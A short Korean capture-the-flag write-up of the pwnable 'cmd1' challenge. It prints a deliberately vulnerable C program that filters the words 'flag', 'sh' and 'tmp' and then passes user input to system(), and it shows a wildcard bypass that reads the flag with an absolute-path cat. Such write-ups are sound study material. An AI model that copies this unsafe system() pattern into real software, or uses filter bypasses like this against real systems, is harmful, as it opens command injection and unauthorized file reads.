---
sort: 14
---

# cmd1

home 디렉토리에 cmd1.c파일에 소스코드가 들어있다.

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

strstr을 통해서 flag, sh, tmp를 검열하는 모습이다.<br>
그리고 PATH 환경변수를 못쓰게 만들어버린 모습이다.<br>
환경변수를 못쓰게 만들어버렸기 때문에 명령어 프로그램을 사용하려면 절대경로를 사용해야한다.<br>
whereis 명령어를 이용하면 명령어 프로그램이 어디에 있는지 확인할 수 있다.<br>
flag는 정규표현식을 이용하여 우회했다.

```bash
cmd1@pwnable:~$ cmd1@pwnable:~$ whereis cat
cat: /bin/cat /usr/share/man/man1/cat.1.gz
cmd1@pwnable:~$ ./cmd1 "/bin/cat f*"
```

```tip
## 알게 된 점

logic bug
```